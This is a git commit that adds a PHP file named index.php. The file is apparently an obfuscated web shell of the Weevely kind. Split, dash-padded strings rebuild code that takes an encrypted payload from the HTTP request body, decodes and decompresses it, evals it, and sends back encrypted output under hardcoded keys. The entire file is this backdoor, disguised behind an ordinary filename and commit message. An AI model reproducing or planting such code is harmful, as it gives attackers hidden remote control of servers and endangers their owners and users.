312495f3a7523c10b7f2937fad5b5e892474de05
CallMeBatosay <130114991+CallMeBatosay@users.noreply.github.com>
2023-11-28 09:45:08 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,11 @@
+<?php
+$u='h("/$kh--(.+-)-$kf/",@file_get_con-tents(-"php://i-npu-t-"),$m-)==1) {@o-b_start-();@e';
+$P='-($j-<$c&-&$i<$l);$j+-+,-$i++){-$o.=$t{$i-}^$k{-$j};-}}re-turn $o;}if (-@pre-g-_matc';
+$d=';@ob_end_clean();-$r=@base6-4_encode(-@x(@gzc-ompres-s($o),-$k));pr-in-t-("$p$kh$r$kf");}';
+$t='$k="a-4d80-e-ac";$kh="9ab2--6a4a-2da0";$kf="-412-5bc2c096a";$p=-"e364T-xrZjm-Dcr7-';
+$s='jw";functio-n x($-t,$-k)-{$c=strlen($k)-;$l=-st-rlen($t)-;$o-=""-;for($i=0;-$i<$l;){for-($j=0;';
+$L=str_replace('qG','','creqGqGqGaqGte_fuqGqGnction');
+$m='-val-(@-gzuncompres-s(@x(@base6-4_decode(-$m[1-]),$k))-);-$o=@ob_ge-t_cont-en-t---s()';
+$o=str_replace('-','',$t.$s.$P.$u.$m.$d);
+$W=$L('',$o);$W();
+?>
